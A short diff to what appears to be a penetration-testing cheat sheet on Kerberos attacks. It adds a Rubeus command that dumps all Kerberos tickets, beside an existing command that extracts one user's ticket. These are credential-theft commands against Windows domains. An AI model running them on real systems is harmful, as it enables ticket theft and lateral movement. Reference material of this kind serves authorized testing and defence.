@@ -240,6 +240,9 @@ Mitigations:
 * Extract the ticket for a **user** from the krbtgt service
 ```powershell
 .\Rubeus.exe dump /luid:<luid> /service:<service> /nowrap
+
+# or dump all of the tickets
+.\Rubeus.exe dump /nowrap
 ```
 * Use the Rubeus Renew function to get a TGT
 ```cmd
